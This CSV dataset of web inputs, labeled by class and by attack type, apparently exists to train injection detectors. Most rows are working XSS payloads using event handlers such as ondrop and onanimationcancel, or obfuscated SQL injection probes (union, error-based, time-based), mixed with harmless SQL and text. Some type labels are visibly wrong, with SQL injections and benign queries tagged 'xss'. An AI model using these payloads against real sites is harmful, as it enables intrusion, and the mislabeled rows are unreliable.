Text,Label,type
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",2,xss
1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,1,xss
"<h2><span class=""mw-headline"" id=""See_also"">See also ",0,xss
"1""  )   union all select null#",1,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></p>",2,xss
"-4580"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""dbhb""  =  ""dbhb",1,sql
"1'+  (  select 'yzxc' where 5230  =  5230   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1,xss
" SELECT * FROM felt ORDER BY mind ASC, buy DESC",0,sql
SELECT TOP 3 * FROM plenty WHERE dawn = 'conversation',0,xss
<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>,2,xss
1'+  (  select 'luhy' where 3112  =  3112 and   (  3020  =  3020  )  *6703  )  +',1,sql
recomendaci$n,0,xss
SELECT COUNT ( youth )  FROM hide,0,xss
32727347a,0,sql
select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,1,xss
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tiet"" like ""tiet",1,sql
